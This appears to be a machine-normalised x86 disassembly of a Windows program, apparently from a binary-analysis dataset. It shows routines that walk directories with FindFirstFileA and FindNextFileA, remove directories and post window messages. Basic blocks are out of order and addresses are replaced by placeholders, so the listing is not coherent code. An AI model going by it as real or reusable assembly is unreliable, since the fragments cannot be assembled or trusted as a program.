lea edx [ esp + 0x1b0 ]
push edx
lea eax [ esp + 0x48 ]
push eax
call sub_402140
add esp 0xc
push eax
lea ecx [ esp + 0x34 ]
mov [ esp + 0x1a8 ] 0x3
call sub_407460
cmp [ esp + 0x58 ] ebx
mov [ esp + 0x1a4 ] 0x2
jb r-xdata
sub esp 0x1c
mov ecx esp
mov [ esp + 0x48 ] esp
lea edx [ esp + 0xa4 ]
push edx
lea eax [ esp + 0x1cc ]
push eax
push ecx
call sub_402140
add esp 0xc
call sub_4075f0
add esp 0x1c
jmp r-xdata
push eax
call [ RemoveDirectoryA@IAT ]
test ebp ebp
je r-xdata
lea eax [ esp + 0x1b0 ]
cmp [ edi + 0x14 ] 0x10
jb r-xdata
mov ebp [ esp + 0x34 ]
mov [ esp + 0x58 ] 0xf
mov [ esp + 0x54 ] 0x0
mov [ esp + 0x44 ] 0x0
mov ecx [ esp + 0x44 ]
push ecx
call j_sub_4b66ed#2
add esp 0x4
cmp [ esp + 0x28 ] esi
jb r-xdata
mov ecx [ esp + 0x2c ]
mov eax [ esp + 0x38 ]
push ecx
lea edx [ esp + 0x34 ]
push edx
push eax
push ebp
call sub_402270
push ebp
call j_sub_4b66ed#2
add esp 0x14
mov eax edi
push eax
call ebx
inc esi
add edi 0x1c
jmp r-xdata
mov eax [ edi ]
push eax
call ebx
inc esi
add edi 0x1c
jmp r-xdata
cmp [ esp + 0x1c4 ] esi
mov [ esp + 0x28 ] 0xf
mov [ esp + 0x24 ] 0x0
mov [ esp + 0x14 ] 0x0
jb r-xdata
mov ecx [ esp + 0x14 ]
push ecx
call j_sub_4b66ed#2
add esp 0x4
test ebp ebp
je r-xdata
mov eax 0x1
mov edx [ esp + 0x1b0 ]
push edx
call j_sub_4b66ed#2
add esp 0x4
sub_4078e0
push 0xffffffff
push sub_4beb98
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x8
mov ecx rw-data
mov [ esp ] rw-data
call sub_404310
mov eax [ rw-data ]
test eax eax
mov [ esp + 0x10 ] 0x0
je r-xdata
mov ecx rw-data
call sub_401420
mov ecx [ esp + 0x8 ]
mov [ fs : 0x0 ] ecx
add esp 0x14
retn
mov ecx rw-data
call sub_403b70
sub esp 0x1c
mov ecx esp
mov [ esp + 0x20 ] esp
push 0xffffffff
push 0x0
mov [ ecx + 0x18 ] 0xf
mov [ ecx + 0x14 ] 0x0
push rw-data
mov [ ecx + 0x4 ] 0x0
call sub_401dd0
call sub_4075f0
add esp 0x1c
sub_407970
push 0xffffffff
push sub_4bebd9
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x19c
push ebx
push ebp
push esi
xor ebx ebx
mov ecx rw-data
mov [ esp + 0x1b0 ] ebx
mov [ esp + 0x28 ] rw-data
call sub_404310
cmp [ rw-data ] ebx
mov [ esp + 0x1b0 ] 0x1
jne r-xdata
mov eax [ esp + 0x1d0 ]
mov ebp 0x10
cmp eax ebp
mov eax [ esp + 0x1bc ]
jae r-xdata
call sub_404670
test eax eax
je r-xdata
lea ecx [ esp + 0x68 ]
push ecx
push eax
call [ FindFirstFileA@IAT ]
cmp eax 0xffffffff
je r-xdata
lea eax [ esp + 0x1bc ]
mov ecx rw-data
call sub_401420
lea ecx [ esp + 0x1b8 ]
call sub_401a90
xor eax eax
jmp r-xdata
cmp [ esp + 0x1d0 ] ebp
mov eax [ esp + 0x1bc ]
jae r-xdata
push eax
call [ FindClose@IAT ]
cmp [ esp + 0x1d0 ] ebp
mov esi [ esp + 0x1bc ]
jae r-xdata
mov ecx [ esp + 0x1a8 ]
pop esi
pop ebp
mov [ fs : 0x0 ] ecx
pop ebx
add esp 0x1a8
retn
push eax
call sub_404440
mov esi eax
add esp 0x4
cmp esi ebx
jne r-xdata
lea eax [ esp + 0x1bc ]
mov ecx rw-data
call sub_401420
lea ecx [ esp + 0x1b8 ]
call sub_401a90
mov eax esi
lea esi [ esp + 0x1bc ]
jmp r-xdata
mov [ esp + 0x24 ] 0xf
mov [ esp + 0x20 ] ebx
mov [ esp + 0x10 ] bl
mov eax [ esp + 0x1d0 ]
cmp eax ebp
mov ecx [ esp + 0x1bc ]
mov [ esp + 0x1b0 ] 0x2
mov esi ecx
jae r-xdata
mov eax ecx
jmp r-xdata
lea esi [ esp + 0x1bc ]
lea eax [ esp + 0x1bc ]
lea edx [ esp + 0xc ]
push edx
push eax
call sub_457f40
add eax esi
add esp 0x4
push eax
call sub_404790
add esp 0x8
test eax eax
jne r-xdata
lea ecx [ esp + 0xc ]
call sub_4480e0
cmp [ esp + 0x24 ] ebp
mov eax [ esp + 0x10 ]
jae r-xdata
push eax
sub esp 0x70
lea eax [ esp + 0x22c ]
mov ecx esp
mov [ esp + 0xa0 ] esp
push eax
call sub_402400
call sub_407320
add esp 0x74
cmp eax ebx
je r-xdata
lea eax [ esp + 0x10 ]
mov [ esp + 0x48 ] 0xf
mov [ esp + 0x44 ] ebx
mov [ esp + 0x34 ] bl
mov [ esp + 0x64 ] 0xf
mov [ esp + 0x60 ] ebx
mov [ esp + 0x50 ] bl
push 0xffffffff
push ebx
lea ecx [ esp + 0x1c0 ]
push ecx
lea ecx [ esp + 0x3c ]
mov [ esp + 0x1bc ] 0x3
call sub_401dd0
push 0xffffffff
push ebx
lea edx [ esp + 0x14 ]
push edx
lea ecx [ esp + 0x58 ]
call sub_401dd0
lea eax [ esp + 0x30 ]
push eax
mov ecx rw-data
call sub_4074f0
mov eax [ rw-data ]
cmp [ eax - 0x4 ] ebp
jb r-xdata
lea esi [ eax - 0x18 ]
mov esi [ eax - 0x18 ]
jmp r-xdata
lea ecx [ esp + 0x30 ]
call sub_401ae0
lea ecx [ esp + 0xc ]
call sub_4480e0
sub_407bb0
push ebx
push esi
mov esi ecx
push edi
mov edi [ esi + 0x4 ]
test edi edi
jne r-xdata
mov ecx [ esi + 0x8 ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x6
mov eax edx
shr eax 0x1f
add edx eax
mov ebx edx
xor ebx ebx
jmp r-xdata
mov ecx [ esp + 0x10 ]
mov edx [ esi + 0x8 ]
push ecx
push ecx
mov eax esp
mov [ eax ] edx
lea eax [ esp + 0x18 ]
push eax
mov ecx esi
call sub_407580
pop edi
pop esi
pop ebx
retn 0x4
mov ecx [ esi + 0xc ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x6
mov ecx edx
shr ecx 0x1f
add edx ecx
cmp ebx edx
jae r-xdata
test edi edi
je r-xdata
mov edx [ esp + 0x10 ]
mov eax [ esp + 0x10 ]
mov edi [ esi + 0x8 ]
push edx
push esi
push eax
push 0x1
push edi
call sub_4039b0
add esp 0x14
add edi 0x70
mov [ esi + 0x8 ] edi
pop edi
pop esi
pop ebx
retn 0x4
sub_407c40
push 0xffffffff
push sub_4bec27
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x244
push ebx
push ebp
push esi
push edi
mov ecx rw-data
mov [ esp + 0x58 ] rw-data
call sub_404310
mov eax [ rw-data ]
xor ebx ebx
cmp eax ebx
mov [ esp + 0x25c ] ebx
jne r-xdata
mov esi [ esp + 0x264 ]
lea eax [ esp + 0x114 ]
push eax
push esi
call [ FindFirstFileA@IAT ]
cmp eax 0xffffffff
je r-xdata
call sub_404670
test eax eax
je r-xdata
push esi
call sub_404440
mov edi eax
add esp 0x4
cmp edi ebx
je r-xdata
push eax
call [ FindClose@IAT ]
jmp r-xdata
mov ecx rw-data
call sub_401420
xor eax eax
jmp r-xdata
mov ebp 0xf
mov [ esp + 0x28 ] ebp
mov [ esp + 0x24 ] ebx
mov [ esp + 0x14 ] bl
mov [ esp + 0x54 ] ebp
mov [ esp + 0x50 ] ebx
mov [ esp + 0x40 ] bl
push esi
mov [ esp + 0x260 ] 0x2
call sub_457f40
mov edi eax
add esp 0x4
lea ecx [ edi - 0x1 ]
push ecx
push esi
lea ecx [ esp + 0x18 ]
call sub_401e80
push esi
call [ lstrlenA@IAT ]
sub eax edi
push eax
add edi esi
push edi
lea ecx [ esp + 0x44 ]
call sub_401e80
mov eax [ esp + 0x28 ]
mov edi 0x10
cmp eax edi
mov eax [ esp + 0x14 ]
jae r-xdata
mov ecx rw-data
call sub_401420
mov eax edi
jmp r-xdata
mov ecx rw-data
call sub_401420
mov eax esi
mov ecx [ esp + 0x254 ]
pop edi
pop esi
pop ebp
mov [ fs : 0x0 ] ecx
pop ebx
add esp 0x250
retn
push eax
call sub_407c40
add esp 0x4
cmp eax ebx
jne r-xdata
lea eax [ esp + 0x14 ]
mov [ esp + 0x30 ] ebx
mov [ esp + 0x34 ] ebx
mov [ esp + 0x38 ] ebx
cmp [ esp + 0x28 ] edi
mov eax [ esp + 0x14 ]
mov [ esp + 0x25c ] 0x3
jae r-xdata
lea ecx [ esp + 0x3c ]
call sub_4480e0
lea ecx [ esp + 0x10 ]
call sub_4480e0
mov ecx rw-data
call sub_401420
xor eax eax
jmp r-xdata
mov edx [ rw-data ]
push edx
lea ecx [ esp + 0x30 ]
push ecx
push eax
lea ecx [ esp + 0x6c ]
call sub_403030
lea edx [ esp + 0x60 ]
push edx
mov [ esp + 0x260 ] 0x4
mov [ esp + 0x88 ] 0x2
call sub_4090d0
mov edi [ esp + 0x34 ]
mov eax [ esp + 0x38 ]
add esp 0x4
cmp edi eax
je r-xdata
lea eax [ esp + 0x14 ]
lea ecx [ esp + 0x60 ]
call sub_401a00
lea ecx [ esp + 0x2c ]
call sub_403b20
mov eax [ esp + 0x54 ]
mov esi 0x10
cmp eax esi
jb r-xdata
mov eax esi
lea edx [ eax + 0x1 ]
lea esp [ esp ]
cmp [ esp + 0x28 ] esi
mov [ esp + 0x54 ] ebp
mov [ esp + 0x50 ] ebx
mov [ esp + 0x40 ] bl
jb r-xdata
mov ecx [ esp + 0x40 ]
push ecx
call j_sub_4b66ed#2
add esp 0x4
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
mov eax [ edi + 0x14 ]
push esi
push eax
push ebx
mov ecx edi
call sub_401150
test eax eax
mov eax [ esp + 0x34 ]
je r-xdata
mov [ esp + 0x28 ] ebp
mov [ esp + 0x24 ] ebx
mov [ esp + 0x14 ] bl
mov edx [ esp + 0x14 ]
push edx
call j_sub_4b66ed#2
add esp 0x4
cmp edi eax
jne r-xdata
add edi 0x70
cmp edi eax
jne r-xdata
sub esp 0x70
mov ecx esp
mov [ esp + 0xcc ] esp
push edi
call sub_402400
call sub_407970
add esp 0x70
lea ecx [ esp + 0x60 ]
mov esi eax
call sub_401a00
lea ecx [ esp + 0x2c ]
call sub_403b20
mov eax [ esp + 0x54 ]
mov edi 0x10
cmp eax edi
jb r-xdata
jmp r-xdata
cmp [ esp + 0x28 ] edi
mov [ esp + 0x54 ] ebp
mov [ esp + 0x50 ] ebx
mov [ esp + 0x40 ] bl
jb r-xdata
mov eax [ esp + 0x40 ]
push eax
call j_sub_4b66ed#2
add esp 0x4
mov [ esp + 0x28 ] ebp
mov [ esp + 0x24 ] ebx
mov [ esp + 0x14 ] bl
mov ecx [ esp + 0x14 ]
push ecx
call j_sub_4b66ed#2
add esp 0x4
sub_407f10
push ebp
mov ebp esp
push 0xffffffff
push sub_4bec9a
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x6e4
push ebx
push esi
xor ebx ebx
push edi
mov edi [ ebp + 0x8 ]
mov [ ebp - 0x10 ] esp
mov [ ebp - 0x30 ] edi
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x14 ] ebx
mov eax [ edi + 0x24 ]
test al 0x1
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x40 ] ebx
mov [ ebp - 0x3c ] ebx
mov [ ebp - 0x38 ] ebx
mov [ ebp - 0x120 ] r--data
mov [ ebp - 0x11c ] r--data
mov [ ebp - 0x118 ] r--data
je r-xdata
mov ecx 0x2
test cl al
je r-xdata
mov cl al
and cl 0x4
neg cl
mov dl al
mov [ ebp - 0x40 ] 0x1
sbb ecx ecx
and dl 0x8
add ecx 0x2
neg dl
sbb edx edx
add edx 0x2
mov [ ebp - 0x38 ] edx
jmp r-xdata
test al 0x3
jne r-xdata
mov [ ebp - 0x40 ] ecx
mov [ ebp - 0x38 ] ecx
mov [ ebp - 0x3c ] ecx
mov [ ebp - 0xfc ] 0xf
mov [ ebp - 0x100 ] ebx
mov [ ebp - 0x110 ] 0x0
mov [ ebp - 0xec ] ebx
push 0xffffffff
push ebx
lea esi [ edi + 0x4 ]
push esi
lea ecx [ ebp - 0x114 ]
mov [ ebp - 0x4 ] 0x1
call sub_401dd0
mov eax [ edi + 0x90 ]
lea ecx [ ebp - 0x114 ]
push ecx
lea ecx [ ebp - 0x24 ]
mov [ ebp - 0xf8 ] eax
mov [ ebp - 0xf0 ] ebx
mov [ ebp - 0xf4 ] ebx
call sub_4038b0
cmp [ esi + 0x18 ] 0x10
jb r-xdata
mov [ edi + 0x24 ] ebx
mov [ ebp - 0x40 ] ebx
mov [ ebp - 0x3c ] ebx
mov [ ebp - 0x38 ] ebx
add esi 0x4
mov esi [ esi + 0x4 ]
jmp r-xdata
mov [ ebp - 0x50 ] ebx
mov [ ebp - 0x4c ] ebx
mov ecx [ ebp - 0x29c ]
mov edx [ ebp - 0x298 ]
push eax
mov [ ebp - 0x4c ] ecx
mov [ ebp - 0x50 ] edx
call [ FindClose@IAT ]
jmp r-xdata
lea edx [ ebp - 0x2b8 ]
push edx
push esi
call [ FindFirstFileA@IAT ]
cmp eax 0xffffffff
je r-xdata
mov edx [ ebp - 0x14 ]
add eax edx
lea edx [ ebp - 0x24 ]
mov esi [ edx + 0x8 ]
lea ecx [ eax - 0x1 ]
cmp esi ecx
mov [ ebp - 0x2c ] eax
ja r-xdata
mov ecx [ ebp - 0x14 ]
add eax ecx
lea edx [ ebp - 0x24 ]
mov esi [ edx + 0x8 ]
lea ecx [ eax - 0x1 ]
cmp esi ecx
mov [ ebp - 0x50 ] eax
ja r-xdata
mov eax 0xf
mov [ ebp - 0x48 ] ebx
mov [ ebp - 0x44 ] ebx
mov [ ebp - 0xcc ] eax
mov [ ebp - 0xd0 ] ebx
mov [ ebp - 0xe0 ] 0x0
mov [ ebp - 0x78 ] eax
mov [ ebp - 0x7c ] ebx
mov [ ebp - 0x8c ] 0x0
mov [ ebp - 0x4 ] 0x2
call [ GetTickCount@IAT ]
mov [ ebp - 0x54 ] eax
mov [ ebp - 0x58 ] eax
mov [ ebp - 0x31 ] 0x1
mov edx [ edx + 0x4 ]
mov ecx [ edx + ecx * 4 ]
mov ecx [ ecx + 0x1c ]
test ecx ecx
je r-xdata
sub ecx esi
mov edx [ edx + 0x4 ]
mov ecx [ edx + ecx * 4 ]
mov edx [ ecx + 0x20 ]
test edx edx
je r-xdata
sub ecx esi
lea edx [ ebp - 0x24 ]
mov esi [ edx + 0x8 ]
lea ecx [ eax - 0x1 ]
cmp esi ecx
mov [ ebp - 0x2c ] eax
ja r-xdata
cmp ecx 0x3
je r-xdata
mov [ edi + 0x9c ] 0x63
jmp r-xdata
lea ecx [ ebp - 0x24 ]
mov edx [ ecx + 0x8 ]
mov [ ebp - 0x50 ] eax
dec eax
cmp edx eax
ja r-xdata
mov edx [ edx + 0x4 ]
mov ecx [ edx + ecx * 4 ]
mov edx [ ecx + 0x20 ]
mov [ ebp - 0x2c ] eax
lea ecx [ ebp - 0x24 ]
dec eax
test edx edx
mov edx [ ecx + 0x8 ]
jne r-xdata
sub ecx esi
lea ecx [ ebp - 0x24 ]
mov edx [ ecx + 0x8 ]
mov [ ebp - 0x2c ] eax
dec eax
cmp edx eax
ja r-xdata
mov [ edi + 0x9c ] 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x38 ]
mov ecx [ ebp - 0x3c ]
and eax 0x1
shl eax 0x1
and ecx 0x1
or eax ecx
mov ecx [ ebp - 0x40 ]
shl eax 0x2
or eax ecx
mov ecx [ ebp - 0x30 ]
mov [ ecx + 0x24 ] eax
mov al [ ecx + 0xa8 ]
xor esi esi
test al al
jne r-xdata
mov edx [ ecx + 0x4 ]
mov eax [ edx + eax * 4 ]
mov ecx [ eax + 0x20 ]
push ecx
call [ FindClose@IAT ]
sub eax edx
cmp edx eax
ja r-xdata
cmp edx eax
ja r-xdata
mov edx [ ecx + 0x4 ]
mov eax [ edx + eax * 4 ]
mov ecx [ eax + 0x28 ]
test ecx ecx
jne r-xdata
sub eax edx
mov eax [ ebp - 0x78 ]
mov ebx 0x10
cmp eax ebx
jb r-xdata
mov eax [ ecx + 0xac ]
push ecx
push esi
push 0x1800
push eax
call [ PostMessageA@IAT ]
mov ecx [ ecx + 0x4 ]
lea edx [ ebp - 0x2b8 ]
push edx
mov edx [ ecx + eax * 4 ]
mov eax [ edx + 0x20 ]
push eax
call [ FindNextFileA@IAT ]
test eax eax
jne r-xdata
sub eax edx
mov edx [ ecx + 0x4 ]
mov eax [ edx + eax * 4 ]
cmp [ eax + 0x18 ] ebx
jb r-xdata
sub eax edx
mov ecx [ ebp - 0x18 ]
mov eax [ ebp - 0x14 ]
lea edx [ ebp - 0x6f0 ]
add eax ecx
push edx
lea edx [ ebp - 0x24 ]
mov esi [ edx + 0x8 ]
lea ecx [ eax - 0x1 ]
cmp esi ecx
mov [ ebp - 0x4 ] 0x2
mov [ ebp - 0x2c ] eax
ja r-xdata
mov ecx [ ebp - 0x18 ]
mov edx [ ebp - 0x14 ]
lea eax [ edx + ecx ]
lea edx [ ebp - 0x24 ]
mov esi [ edx + 0x8 ]
lea ecx [ eax - 0x1 ]
cmp esi ecx
mov [ ebp - 0x4 ] 0x4
mov [ ebp - 0x2c ] eax
ja r-xdata
cmp [ ebp - 0xcc ] ebx
mov edi 0xf
mov [ ebp - 0x78 ] edi
mov [ ebp - 0x7c ] esi
mov [ ebp - 0x8c ] 0x0
jb r-xdata
mov ecx [ ebp - 0x8c ]
push ecx
call j_sub_4b66ed#2
add esp 0x4
mov esi [ lstrcmpA@IAT ]
push r--data
lea edx [ ebp - 0x28c ]
push edx
call esi
test eax eax
je r-xdata
mov ecx [ ebp - 0x18 ]
mov edx [ ebp - 0x14 ]
lea eax [ edx + ecx ]
lea ecx [ ebp - 0x24 ]
mov edx [ ecx + 0x8 ]
mov [ ebp - 0x2c ] eax
dec eax
cmp edx eax
ja r-xdata
add eax 0x4
mov eax [ eax + 0x4 ]
jmp r-xdata
mov edx [ edx + 0x4 ]
mov ecx [ edx + ecx * 4 ]
mov edx [ ecx + 0x24 ]
lea ecx [ ebp - 0x24 ]
push edx
mov edx [ ecx + 0x8 ]
mov [ ebp - 0x2c ] eax
dec eax
cmp edx eax
ja r-xdata
sub ecx esi
mov edx [ edx + 0x4 ]
mov ecx [ edx + ecx * 4 ]
cmp [ ecx + 0x18 ] ebx
jb r-xdata
sub ecx esi
mov [ ebp - 0xcc ] edi
mov [ ebp - 0xd0 ] esi
mov [ ebp - 0xe0 ] 0x0
mov eax [ ebp - 0xec ]
cmp eax esi
mov [ ebp - 0x4 ] 0xa
je r-xdata
mov edx [ ebp - 0xe0 ]
push edx
call j_sub_4b66ed#2
add esp 0x4
mov ebx 0x10
nop
push r--data
lea eax [ ebp - 0x28c ]
push eax
call esi
test eax eax
je r-xdata
mov ecx [ ecx + 0x4 ]
mov edx [ ecx + eax * 4 ]
mov eax [ edx + 0x20 ]
push eax
call [ FindClose@IAT ]
sub eax edx
mov ecx [ ebp - 0x14 ]
mov eax [ ebp - 0x18 ]
add eax ecx
lea ecx [ ebp - 0x24 ]
mov edx [ ecx + 0x8 ]
mov [ ebp - 0x2c ] eax
dec eax
cmp edx eax
ja r-xdata
mov ecx [ ebp - 0x14 ]
mov eax [ ebp - 0x18 ]
add eax ecx
lea ecx [ ebp - 0x24 ]
mov edx [ ecx + 0x8 ]
mov [ ebp - 0x2c ] eax
dec eax
cmp edx eax
ja r-xdata
push eax
call sub_457f00
add esp 0x4
test eax eax
jle r-xdata
mov ecx [ ecx + 0x4 ]
mov eax [ ecx + eax * 4 ]
add eax 0x28
mov eax [ eax ]
test eax eax
push ecx
mov [ ebp - 0x28 ] esp
mov ecx esp
je r-xdata
sub eax edx
lea esi [ ecx + 0x4 ]
mov esi [ ecx + 0x4 ]
jmp r-xdata
cmp [ ebp - 0xfc ] ebx
jb r-xdata
mov edx [ eax + 0x4 ]
mov ecx eax
add eax 0x4
dec edx
cmp edx esi
mov [ eax ] edx
jne r-xdata
mov ecx [ ebp - 0x18 ]
mov edx [ ebp - 0x14 ]
lea eax [ edx + ecx ]
lea ecx [ ebp - 0x24 ]
mov edx [ ecx + 0x8 ]
mov [ ebp - 0x2c ] eax
dec eax
cmp edx eax
ja r-xdata
mov ecx [ ebp - 0x18 ]
lea eax [ eax + ecx - 0x1 ]
mov ecx [ ebp - 0x1c ]
cmp ecx eax
ja r-xdata
mov edx [ ecx + 0x4 ]
mov ecx [ edx + eax * 4 ]
mov eax r--data
lea esi [ eax + 0x1 ]
mov edi edi
sub eax edx
mov edx [ ecx + 0x4 ]
mov eax [ edx + eax * 4 ]
push 0x5c
push 0x1
mov ecx eax
call sub_4017f0
sub eax edx
mov [ ecx ] eax
call [ rw-data ]
test eax eax
jne r-xdata
inc [ eax + 0x4 ]
mov ecx [ ecx + 0x4 ]
mov edi [ ecx + eax * 4 ]
push 0x1
push 0x0
push 0x0
push 0x0
push 0x0
push esi
call sub_41c070
mov esi eax
add esp 0x18
test esi esi
je r-xdata
sub eax edx
lea ecx [ ebp - 0x24 ]
mov edx [ ecx + 0x8 ]
mov [ ebp - 0x2c ] eax
dec eax
cmp edx eax
ja r-xdata
lea ecx [ ebp - 0x24 ]
mov [ ebp - 0xfc ] edi
mov [ ebp - 0x100 ] esi
mov [ ebp - 0x110 ] 0x0
mov [ ebp - 0x4 ] 0xffffffff
call sub_402040
mov ecx [ ebp - 0xc ]
pop edi
pop esi
xor eax eax
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov ecx [ ebp - 0x110 ]
push ecx
call j_sub_4b66ed#2
add esp 0x4
mov eax [ ecx ]
push 0x1
call [ eax ]
mov ecx [ ecx + 0x4 ]
lea edx [ ebp - 0x28c ]
push edx
mov edx [ ecx + eax * 4 ]
push edx
lea eax [ ebp - 0x15c ]
push eax
call sub_402140
add esp 0xc
push 0xffffffff
push 0x0
push eax
lea ecx [ ebp - 0xe4 ]
mov [ ebp - 0x4 ] 0x3
call sub_401dd0
cmp [ ebp - 0x144 ] ebx
mov [ ebp - 0x4 ] 0x2
jb r-xdata
sub eax edx
mov edx [ ebp - 0x20 ]
mov ecx [ edx + eax * 4 ]
call sub_4016b0
dec [ ebp - 0x14 ]
jne r-xdata
sub eax ecx
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
sub eax esi
push eax
push r--data
call sub_401cc0
mov ecx [ ebp - 0x14 ]
mov eax [ ebp - 0x18 ]
add eax ecx
lea edx [ ebp - 0x24 ]
mov esi [ edx + 0x8 ]
lea ecx [ eax - 0x1 ]
cmp esi ecx
mov [ ebp - 0x2c ] eax
ja r-xdata
jge r-xdata
mov cl [ ebp - 0x6b8 ]
test cl cl
lea eax [ ebp - 0x6b8 ]
je r-xdata
mov ecx [ edi + 0x28 ]
test ecx ecx
je r-xdata
inc [ esi + 0x4 ]
mov eax [ ebp - 0x298 ]
mov edx [ ebp - 0x2b8 ]
mov ecx [ ebp - 0x29c ]
mov [ ebp - 0xc4 ] eax
mov eax [ ebp - 0x2a0 ]
mov [ ebp - 0xc8 ] edx
mov edx [ ebp - 0x2a4 ]
mov [ ebp - 0xb8 ] eax
or eax 0xffffffff
mov [ ebp - 0xc0 ] ecx
mov ecx [ ebp - 0x18 ]
mov [ ebp - 0xbc ] edx
mov edx [ ebp - 0x14 ]
xor esi esi
mov [ ebp - 0xb4 ] eax
mov [ ebp - 0xa8 ] eax
lea eax [ edx + ecx ]
mov ebx 0xf
lea ecx [ ebp - 0x24 ]
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x148 ] esi
mov [ ebp - 0x158 ] 0x0
mov [ ebp - 0xa4 ] esi
mov edx [ ecx + 0x8 ]
mov [ ebp - 0x2c ] eax
dec eax
cmp edx eax
ja r-xdata
mov ecx [ ebp - 0x158 ]
push ecx
call j_sub_4b66ed#2
add esp 0x4
mov [ ebp - 0x18 ] 0x0
mov edx [ edx + 0x4 ]
mov ecx [ edx + ecx * 4 ]
cmp [ ecx + 0x18 ] ebx
jb r-xdata
sub ecx esi
mov eax [ ebp - 0x14 ]
test eax eax
je r-xdata
mov [ edi + 0x9c ] 0x1
jmp r-xdata
mov ecx [ ebp - 0x14 ]
mov eax [ ebp - 0x18 ]
add eax ecx
lea ecx [ ebp - 0x24 ]
mov edx [ ecx + 0x8 ]
mov [ ebp - 0x2c ] eax
dec eax
cmp edx eax
ja r-xdata
mov cl [ eax ]
mov dl cl
xor dl 0x20
add dl 0x5f
cmp dl 0x3b
ja r-xdata
mov [ edi + 0x28 ] esi
mov edi [ ebp - 0x30 ]
dec [ ecx + 0x4 ]
jne r-xdata
mov ecx [ ecx + 0x4 ]
mov eax [ ecx + eax * 4 ]
mov edx [ eax + 0x24 ]
mov [ ebp - 0xa0 ] edx
inc [ eax + 0x24 ]
mov [ ebp - 0x98 ] esi
mov [ ebp - 0x94 ] esi
xor edi edi
sub eax edx
lea edx [ ecx + 0x4 ]
mov edx [ ecx + 0x4 ]
jmp r-xdata
mov edx [ ecx + 0x4 ]
mov eax [ edx + eax * 4 ]
push r--data
push eax
lea ecx [ ebp - 0x140 ]
push ecx
call sub_402140
lea edx [ ebp - 0x6b8 ]
push edx
push eax
lea eax [ ebp - 0x178 ]
push eax
mov [ ebp - 0x4 ] 0x6
call sub_402140
add esp 0x18
push 0xffffffff
push 0x0
push eax
lea ecx [ ebp - 0xe4 ]
mov [ ebp - 0x4 ] 0x7
call sub_401dd0
cmp [ ebp - 0x160 ] ebx
jb r-xdata
sub eax edx
cmp cl 0x5c
jne r-xdata
inc eax
jmp r-xdata
mov edx [ ecx ]
push 0x1
call [ edx ]
lea ecx [ ebp - 0xe4 ]
push ecx
mov ecx [ esi ]
call sub_407bb0
mov al [ esi + 0x29 ]
test al al
je r-xdata
mov ecx [ ecx + 0x4 ]
mov esi [ ecx + eax * 4 ]
lea eax [ ebp - 0x2b8 ]
push eax
push edx
call [ FindFirstFileA@IAT ]
mov [ esi + 0x20 ] eax
mov ecx [ ebp - 0x18 ]
mov edx [ ebp - 0x14 ]
lea eax [ edx + ecx ]
lea edx [ ebp - 0x24 ]
mov esi [ edx + 0x8 ]
lea ecx [ eax - 0x1 ]
cmp esi ecx
mov [ ebp - 0x2c ] eax
ja r-xdata
sub eax esi
lea ecx [ ebp - 0x24 ]
mov esi [ ecx + 0x8 ]
mov [ ebp - 0x2c ] eax
dec eax
cmp esi eax
ja r-xdata
mov eax [ ebp - 0x128 ]
xor edi edi
cmp eax 0x10
mov ebx 0xf
mov [ ebp - 0x160 ] ebx
mov [ ebp - 0x164 ] edi
mov [ ebp - 0x174 ] 0x0
mov [ ebp - 0x4 ] 0x2
jb r-xdata
mov ecx [ ebp - 0x174 ]
push ecx
call j_sub_4b66ed#2
add esp 0x4
mov cl [ eax + 0x1 ]
inc eax
test cl cl
jne r-xdata
mov [ eax ] 0x2f
sub esp 0x1c
mov ecx esp
mov [ ebp - 0x28 ] esp
push 0xffffffff
xor edi edi
push edi
lea edx [ ebp - 0xe4 ]
mov [ ecx + 0x18 ] ebx
mov [ ecx + 0x14 ] edi
push edx
mov [ ecx + 0x4 ] 0x0
call sub_401dd0
call sub_401530
mov ecx eax
mov eax [ ebp - 0xa4 ]
add esp 0x1c
cmp eax edi
mov [ ebp - 0x28 ] ecx
jne r-xdata
mov edx [ ebp - 0x44 ]
mov eax [ ebp - 0x48 ]
push 0x0
push 0x64
push edx
push eax
call sub_4b6490
push edi
push esi
push edx
push eax
call sub_4b6420
mov ecx [ ebp - 0x30 ]
mov [ ecx + 0xb0 ] eax
mov ecx rw-data
mov [ ebp - 0x28 ] rw-data
call sub_404310
mov ecx [ esi ]
lea eax [ ebp - 0xe4 ]
push eax
mov [ ebp - 0x4 ] 0x8
call sub_407bb0
mov ecx rw-data
mov [ ebp - 0x4 ] 0x2
call sub_401420
jmp r-xdata
mov edx [ edx + 0x4 ]
mov ecx [ edx + ecx * 4 ]
mov esi [ ecx + 0x14 ]
lea edx [ ebp - 0x24 ]
lea ecx [ eax - 0x1 ]
mov [ ebp - 0x2c ] eax
mov eax [ edx + 0x8 ]
cmp eax ecx
ja r-xdata
sub ecx esi
mov eax [ ebp - 0x6ec ]
mov ecx [ ebp - 0x6d8 ]
mov edx [ ebp - 0x6d4 ]
mov [ ebp - 0xc8 ] eax
mov eax [ ebp - 0x6c8 ]
mov [ ebp - 0xbc ] eax
mov eax [ ebp - 0x6f0 ]
mov [ ebp - 0xc4 ] ecx
mov ecx [ ebp - 0x6c4 ]
mov esi 0x3
cmp eax esi
mov [ ebp - 0x128 ] ebx
mov [ ebp - 0x12c ] edi
mov [ ebp - 0x13c ] 0x0
mov [ ebp - 0xc0 ] edx
mov [ ebp - 0xb8 ] ecx
jne r-xdata
mov edx [ ebp - 0x13c ]
push edx
call j_sub_4b66ed#2
add esp 0x4
cmp ecx 0x6
je r-xdata
test [ ebp - 0xc8 ] 0x10
jne r-xdata
mov esi [ ebp - 0x48 ]
mov edx [ ebp - 0xc4 ]
mov ecx [ ebp - 0x44 ]
mov eax [ ebp - 0xc0 ]
mov edi [ ebp - 0x4c ]
add esi edx
